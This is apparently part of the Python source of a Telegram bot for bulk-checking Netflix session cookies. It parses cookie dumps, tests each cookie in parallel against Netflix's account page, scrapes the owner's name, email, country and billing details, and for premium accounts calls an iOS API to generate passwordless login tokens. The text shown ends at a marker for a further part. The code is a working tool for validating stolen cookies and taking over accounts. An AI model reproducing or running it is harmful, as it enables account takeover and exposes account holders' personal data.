# bulk_netflix_bot.py - PART 1
# Netflix Bulk Cookie Checker Bot
# Developer: @iam_esh | Channel: https://t.me/eshinfoo

import asyncio
import html
import json
import os
import re
import time
import zipfile
import io
from collections import defaultdict
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Optional
import threading

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode

# ============================================================
#                    CONFIGURATION
# ============================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHANNEL_LINK = "https://t.me/eshinfoo"
DEVELOPER = "@iam_esh"
OWNER = "@iam_esh"
MAX_WORKERS = 50          # Concurrent checks (50 = fast but safe)
BATCH_SIZE = 100          # Cookies per batch report
REQUEST_TIMEOUT = 15      # Seconds to wait for Netflix response
MAX_RETRIES = 3           # Retry failed requests 3 times

# ============================================================
#              PREMIUM STYLING SYMBOLS
# ============================================================
# Using line emojis and symbols for premium look
# No regular emojis - pure aesthetic symbols

S = {
    # Basic symbols
    "star": "✦",
    "spark": "✧", 
    "dot": "•",
    "arrow": "➜",
    "double_arrow": "➤",
    
    # Lines and borders
    "line": "─",
    "double_line": "═",
    "branch": "├",
    "corner": "└",
    "vertical": "│",
    
    # Box elements
    "bullet": "◉",
    "square": "■",
    "diamond": "♦",
    
    # Status symbols
    "check": "✓",
    "cross": "✗",
    "warning": "⚠",
    "info": "ℹ",
    
    # Time and progress
    "clock": "⏣",
    "target": "⦿",
    "pointer": "⌲",
    
    # Premium symbols
    "crown": "♔",
    "shield": "⛊",
    "calendar": "📅",
    
    # Action symbols
    "link": "🔗",
    "copyright": "©",
    "rocket": "🚀",
    "fire": "🔥",
    "package": "📦",
    "speed": "⚡",
    "queue": "📋",
    "done": "✅"
}

# ============================================================
#                    FOLDER SETUP
# ============================================================

# Create necessary folders for operation
os.makedirs("temp_cookies", exist_ok=True)      # Temporary storage for uploaded files
os.makedirs("bot_output", exist_ok=True)         # Output for individual checks
os.makedirs("bulk_results", exist_ok=True)       # Bulk check results storage

# ============================================================
#                 USER DATA STORAGE
# ============================================================
# In-memory storage for user statistics and sessions
# In production, replace with Redis/PostgreSQL for scaling

user_data = defaultdict(lambda: {
    "total": 0,           # Total cookies checked
    "valid": 0,           # Valid accounts found
    "invalid": 0,         # Invalid/expired cookies
    "free": 0,            # Free/standard accounts
    "premium": 0,         # Premium accounts found
    "last_check": None,   # Timestamp of last check
    "redeem_count": 0,    # Number of codes redeemed
    "last_redeem": None,  # Last redeem timestamp
    "batch_jobs": [],     # History of batch jobs
    "current_batch": None # Current active batch
})

# Active batches tracking (user_id -> batch data)
active_batches = {}
batch_lock = threading.Lock()

# ============================================================
#                 NFTOKEN API CONFIG
# ============================================================
# NFToken allows passwordless login for premium accounts
# These are official Netflix iOS API endpoints

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false"}',
    "device_type": "NFAPPL-02-",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "accept-language": "en-US;q=1",
}

# ============================================================
#                COOKIE CONSTANTS
# ============================================================

# Netflix requires these cookies for authentication
REQUIRED_COOKIES = {"NetflixId"}
ALL_COOKIES = REQUIRED_COOKIES | {"SecureNetflixId", "nfvdid"}

# ============================================================
#                 HELPER FUNCTIONS
# ============================================================

def decode_value(value):
    """Decode Netflix's encoded values (HTML entities, Unicode, etc.)"""
    if not value:
        return None
    cleaned = html.unescape(str(value))
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"')
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None
    # ============================================================
#              COOKIE EXTRACTION FUNCTIONS
# ============================================================
# Supports multiple formats:
# 1. JSON array format (browser extensions)
# 2. Netscape format (standard cookie export)
# 3. Raw text format (NetflixId=value)

def extract_cookie_bundles(content: str) -> List[Dict]:
    """
    Extract multiple cookie bundles from file content
    Returns list of dictionaries with 'cookies' and 'raw' keys
    """
    bundles = []
    
    # --------------------------------------------------------
    # METHOD 1: Try JSON array format (multiple cookies)
    # --------------------------------------------------------
    try:
        data = json.loads(content)
        
        # Case: List of cookies (multiple accounts in one file)
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    cookies = {}
                    for cookie_name in ALL_COOKIES:
                        val = item.get(cookie_name) or item.get(cookie_name.lower())
                        if val:
                            cookies[cookie_name] = val
                    if cookies.get("NetflixId"):
                        bundles.append({
                            "cookies": cookies, 
                            "raw": json.dumps(item)
                        })
        
        # Case: Single cookie object
        elif isinstance(data, dict):
            cookies = {}
            for cookie_name in ALL_COOKIES:
                val = data.get(cookie_name) or data.get(cookie_name.lower())
                if val:
                    cookies[cookie_name] = val
            if cookies.get("NetflixId"):
                bundles.append({
                    "cookies": cookies, 
                    "raw": json.dumps(data)
                })
    except:
        pass  # Not JSON format, continue to next method
    
    # --------------------------------------------------------
    # METHOD 2: Try Netscape format (standard cookie export)
    # --------------------------------------------------------
    if not bundles:
        current_cookies = {}
        lines = content.splitlines()
        
        for line in lines:
            line = line.strip()
            
            # Skip empty lines and comments
            if not line or line.startswith("#"):
                continue
            
            # Netscape format: domain\tflag\tpath\tsecure\texpires\tname\tvalue
            parts = line.split("\t")
            
            if len(parts) >= 7:
                name = parts[5].lower()
                
                # Check if this is a Netflix cookie we care about
                if name in {c.lower() for c in ALL_COOKIES}:
                    current_cookies[name.capitalize()] = parts[6]
                    
                    # If we have NetflixId, save this bundle and start fresh
                    if name == "netflixid" and current_cookies.get("NetflixId"):
                        bundles.append({
                            "cookies": current_cookies.copy(), 
                            "raw": line
                        })
                        current_cookies = {}  # Reset for next cookie
    
    # --------------------------------------------------------
    # METHOD 3: Try raw text format (NetflixId=value)
    # --------------------------------------------------------
    if not bundles:
        for line in content.splitlines():
            cookies = {}
            
            for cookie_name in ALL_COOKIES:
                # Pattern: NetflixId=value or NetflixId="value"
                pattern = rf'{cookie_name}[\s]*=[\s]*"?([^";\s]+)"?'
                match = re.search(pattern, line, re.IGNORECASE)
                
                if match:
                    cookies[cookie_name] = match.group(1)
            
            if cookies.get("NetflixId"):
                bundles.append({
                    "cookies": cookies, 
                    "raw": line
                })
    
    return bundles


def cookies_to_netscape(cookies: Dict) -> str:
    """Convert cookie dict to Netscape format string"""
    lines = []
    
    for name, value in cookies.items():
        # Default values for Netscape format
        domain = ".netflix.com"
        tail_match = "TRUE"
        path = "/"
        secure = "TRUE" if name == "SecureNetflixId" else "FALSE"
        expires = "0"
        
        line = f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
        lines.append(line)
    
    return "\n".join(lines)


def validate_cookies(cookies: Dict) -> bool:
    """Check if cookies have required NetflixId"""
    if not cookies:
        return False
    
    netflix_id = cookies.get("NetflixId")
    if not netflix_id:
        return False
    
    # Basic validation - NetflixId should be non-empty string
    return bool(str(netflix_id).strip())


# ============================================================
#                 NFTOKEN GENERATION
# ============================================================

def create_nftoken(cookies: Dict) -> Optional[Dict]:
    """
    Generate NFToken for premium accounts
    NFToken allows passwordless login for 1 hour
    """
    netflix_id = decode_value(cookies.get("NetflixId"))
    if not netflix_id:
        return None
    
    headers = NFTOKEN_HEADERS.copy()
    headers["Cookie"] = f"NetflixId={netflix_id}"
    
    try:
        response = requests.get(
            NFTOKEN_API_URL, 
            params=NFTOKEN_QUERY_PARAMS,
            headers=headers, 
            timeout=15, 
            verify=False
        )
        
        if response.status_code == 200:
            data = response.json()
            
            # Navigate through nested response structure
            token_data = data.get("value", {})
            token_data = token_data.get("account", {})
            token_data = token_data.get("token", {})
            token_data = token_data.get("default", {})
            
            token = decode_value(token_data.get("token"))
            expires = token_data.get("expires")
            
            if token:
                return {
                    "token": token, 
                    "expires": expires
                }
    except Exception as e:
        # Silent fail - NFToken is bonus feature, not critical
        pass
    
    return None


def get_nftoken_expiry(expires) -> str:
    """Format NFToken expiry time for display"""
    if expires:
        try:
            timestamp = int(expires)
            # Handle 13-digit milliseconds timestamp
            if len(str(timestamp)) == 13:
                timestamp //= 1000
            return datetime.fromtimestamp(
                timestamp, 
                tz=timezone.utc
            ).strftime("%Y-%m-%d %H:%M:%S UTC")
        except:
            pass
    
    # Default: 1 hour from now
    return (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")


# ⬇️⬇️⬇️ PART 3 STARTS RIGHT BELOW THIS LINE ⬇️⬇️⬇️
# ============================================================
#              ACCOUNT INFO EXTRACTION
# ============================================================

def extract_account_info(response_text: str) -> Dict:
    """
    Extract account details from Netflix /account/membership page
    Returns dictionary with owner, email, country, plan, etc.
    """
    info = {}
    
    # Regex patterns for different data fields
    patterns = {
        "owner": [
            r'"name"\s*:\s*"([^"]+)"',
            r'"accountOwnerName"\s*:\s*"([^"]+)"'
        ],
        "email": [
            r'"emailAddress"\s*:\s*"([^"]+)"',
            r'"email"\s*:\s*"([^"]+)"'
        ],
        "country": [
            r'"currentCountry"\s*:\s*"([^"]+)"',
            r'"countryOfSignup":\s*"([^"]+)"'
        ],
        "member_since": [
            r'"memberSince":\s*"([^"]+)"'
        ],
        "next_billing": [
            r'"nextBillingDate"\s*:\s*"([^"]+)"'
        ],
        "plan": [
            r'"localizedPlanName"\s*:\s*"([^"]+)"',
            r'"planName"\s*:\s*"([^"]+)"'
        ],
        "streams": [
            r'"maxStreams"\s*:\s*"?([^",}]+)"?'
        ],
        "quality": [
            r'"videoQuality"\s*:\s*"([^"]+)"'
        ],
        "status": [
            r'"membershipStatus"\s*:\s*"([^"]+)"'
        ],
    }
    
    # Extract each field using patterns
    for key, pats in patterns.items():
        for pat in pats:
            match = re.search(pat, response_text, re.IGNORECASE)
            if match:
                info[key] = decode_value(match.group(1))
                break
    
    # Extract profile names (multiple profiles on account)
    profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', response_text)
    if profiles:
        info["profiles"] = ", ".join(set(profiles[:3]))  # Max 3 profiles
    
    # Check if account is on hold (payment issues)
    if re.search(r'"isUserOnHold"\s*:\s*true', response_text, re.IGNORECASE):
        info["on_hold"] = "Yes"
    else:
        info["on_hold"] = "No"
    
    # Check if email is verified
    if re.search(r'"emailVerified"\s*:\s*true', response_text, re.IGNORECASE):
        info["email_verified"] = "Yes"
    else:
        info["email_verified"] = "No"
    
    return info


def check_single_cookie(cookies: Dict) -> Dict:
    """
    Check a single cookie against Netflix API
    Returns result with validity, premium status, account info, and NFToken
    """
    # Create session and add cookies
    session = requests.Session()
    session.cookies.update(cookies)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    }
    
    result = {
        "valid": False,
        "premium": False,
        "info": None,
        "nftoken": None,
        "error": None
    }
    
    try:
        # Request account membership page
        response = session.get(
            "https://www.netflix.com/account/membership",
            headers=headers,
            timeout=REQUEST_TIMEOUT
        )
        
        if response.status_code == 200:
            info = extract_account_info(response.text)
            
            # Check if we got country (indicates successful login)
            if info.get("country"):
                result["valid"] = True
                result["info"] = info
                
                # Check if premium plan (for NFToken generation)
                plan = info.get("plan", "").lower()
                if "premium" in plan:
                    result["premium"] = True
                    result["nftoken"] = create_nftoken(cookies)
                    
    except requests.exceptions.Timeout:
        result["error"] = "Timeout"
    except requests.exceptions.ConnectionError:
        result["error"] = "Connection Error"
    except Exception as e:
        result["error"] = str(e)[:100]
    
    finally:
        session.close()
    
    return result


def check_cookies_batch(cookies_list: List[Dict], progress_callback=None) -> List[Dict]:
    """
    Check multiple cookies in parallel using ThreadPoolExecutor
    Returns results sorted by original order
    """
    results = []
    completed = 0
    total = len(cookies_list)
    
    # Use ThreadPoolExecutor for parallel execution
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Submit all tasks
        future_to_cookie = {
            executor.submit(check_single_cookie, c): i 
            for i, c in enumerate(cookies_list)
        }
        
        # Collect results as they complete
        for future in as_completed(future_to_cookie):
            idx = future_to_cookie[future]
            
            try:
                result = future.result(timeout=30)
                results.append({
                    "index": idx,
                    "cookies": cookies_list[idx],
                    "result": result
                })
            except Exception as e:
                results.append({
                    "index": idx,
                    "cookies": cookies_list[idx],
                    "result": {"valid": False, "error": str(e)}
                })
            
            completed += 1
            if progress_callback:
                progress_callback(completed, total)
    
    # Sort by original index to maintain order
    results.sort(key=lambda x: x["index"])
    return results


# ⬇️⬇️⬇️ PART 4 STARTS RIGHT BELOW THIS LINE ⬇️⬇️⬇️
